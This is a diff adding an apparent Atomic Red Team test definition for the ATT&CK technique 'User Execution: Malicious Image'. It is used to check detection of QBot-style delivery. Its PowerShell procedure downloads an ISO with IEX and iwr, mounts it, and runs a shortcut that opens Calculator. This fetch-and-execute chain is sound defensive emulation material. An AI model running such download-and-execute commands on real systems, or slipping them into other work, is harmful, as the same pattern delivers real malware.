@@ -1,0 +1,21 @@
+{
+  "attack_technique": "T1204.003",
+  "display_name": "User Execution: Malicious Image",
+  "atomic_tests": [
+    {
+      "name": "Malicious Execution from Mounted ISO Image",
+      "description": "Adversaries may rely on a user running a malicious image to facilitate execution",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": true,
+        "cleanup_command": "start-sleep -s 5\nstop-process -Name \"Calculatorapp\" -Force \ndismount-diskimage -ImagePath \"$env:TEMP\\qbot-test.iso\"",
+        "procedure": "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.003/src/qbot-test.iso\" -OutFile \"$env:TEMP\\qbot-test.iso\")\nMount-DiskImage -ImagePath \"$env:TEMP\\qbot-test.iso\"\n$mountedpath = (Get-DiskImage -ImagePath \"$env:TEMP\\qbot-test.iso\" | Get-Volume).DriveLetter\n$finalpath = $mountedpath + \":\\\"\ncd $finalpath\n.\\calc.exe.lnk"
+      },
+      "input_arguments": [],
+      "auto_generated_guid": "e9795c8d-42aa-4ed4-ad80-551ed793d006"
+    }
+  ]
+}
